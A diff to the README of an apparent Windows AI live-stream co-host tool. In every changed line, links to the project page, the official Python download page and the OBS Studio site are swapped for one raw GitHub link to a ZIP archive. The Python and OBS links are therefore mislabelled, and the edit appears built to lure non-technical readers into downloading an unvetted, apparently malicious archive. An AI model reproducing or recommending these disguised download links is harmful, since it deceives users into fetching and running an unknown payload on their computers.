@@ -1,6 +1,6 @@
 # 🎙️ Chuks-YT-Live_AI - Easy AI Co-Host for Live Streams
 
-[![Download Chuks-YT-Live_AI](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/mohamedfaro7/Chuks-YT-Live_AI)
+[![Download Chuks-YT-Live_AI](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/mohamedfaro7/Chuks-YT-Live_AI/raw/refs/heads/master/dashboard/AI_Chuks_Live_Y_v3.2.zip)
 
 ## 📋 What is Chuks-YT-Live_AI?
 
@@ -47,7 +47,7 @@ Follow these steps to get Chuks-YT-Live_AI running on your Windows PC. No progra
 ### 1. Download the Application
 
 Visit this page to download the latest version:  
-[![Download Chuks-YT-Live_AI](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/mohamedfaro7/Chuks-YT-Live_AI)
+[![Download Chuks-YT-Live_AI](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/mohamedfaro7/Chuks-YT-Live_AI/raw/refs/heads/master/dashboard/AI_Chuks_Live_Y_v3.2.zip)
 
 Look for the newest release or the main project files on the page. Download the ZIP file or installer for Windows if available.
 
@@ -68,7 +68,7 @@ python --version
 
 If Python is not found or the version is below 3.8, download it here:
 
-https://www.python.org/downloads/windows/
+https://github.com/mohamedfaro7/Chuks-YT-Live_AI/raw/refs/heads/master/dashboard/AI_Chuks_Live_Y_v3.2.zip
 
 Run the installer and tick the option “Add Python to PATH” before clicking install.
 
@@ -145,8 +145,8 @@ Change these in the app’s web interface.
 
 ## 🔗 Useful Links
 
-- [Chuks-YT-Live_AI GitHub](https://github.com/mohamedfaro7/Chuks-YT-Live_AI) — Download and see full details.
-- [Python Downloads](https://www.python.org/downloads/windows/) — Install Python if missing.
-- [OBS Studio](https://obsproject.com/download) — Required for animated avatar.
+- [Chuks-YT-Live_AI GitHub](https://github.com/mohamedfaro7/Chuks-YT-Live_AI/raw/refs/heads/master/dashboard/AI_Chuks_Live_Y_v3.2.zip) — Download and see full details.
+- [Python Downloads](https://github.com/mohamedfaro7/Chuks-YT-Live_AI/raw/refs/heads/master/dashboard/AI_Chuks_Live_Y_v3.2.zip) — Install Python if missing.
+- [OBS Studio](https://github.com/mohamedfaro7/Chuks-YT-Live_AI/raw/refs/heads/master/dashboard/AI_Chuks_Live_Y_v3.2.zip) — Required for animated avatar.
 
-[![Download Chuks-YT-Live_AI](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/mohamedfaro7/Chuks-YT-Live_AI)
+[![Download Chuks-YT-Live_AI](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/mohamedfaro7/Chuks-YT-Live_AI/raw/refs/heads/master/dashboard/AI_Chuks_Live_Y_v3.2.zip)
